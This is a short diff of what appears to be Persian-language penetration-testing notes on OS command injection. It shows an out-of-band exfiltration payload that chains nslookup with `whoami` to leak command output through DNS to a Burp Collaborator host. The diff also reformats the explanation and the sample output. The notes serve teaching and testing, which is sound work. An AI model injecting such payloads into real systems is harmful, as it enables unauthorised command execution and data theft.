@@ -33,8 +33,8 @@
 
 - **Out-of-band data exfilteration**
     - ```||nslookup+`whoami`.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net||```
-    - <p align="right">در اینحالت می خواهیم نتیجه دستور در کوئری DNS به سمت سرور مهاجم در اینترنت ارسال شود، که در اینجا از Burp Collaborator استفاده شده (باید بر روی Pull now کلیک شود) و خروجی به شکل "peter-jSRUyX.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net.burpcollaborator.net" خواهد بود.</p>
-
+    - <p align="right">در اینحالت می خواهیم نتیجه دستور در کوئری DNS به سمت سرور مهاجم در اینترنت ارسال شود، که در اینجا از Burp Collaborator استفاده شده (باید بر روی Pull now کلیک شود) و خروجی به شکل زیر خواهد بود.</p>
+    - ```peter-jSRUyX.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net.burpcollaborator.net```
 # Code Execution
 
 ## Payload
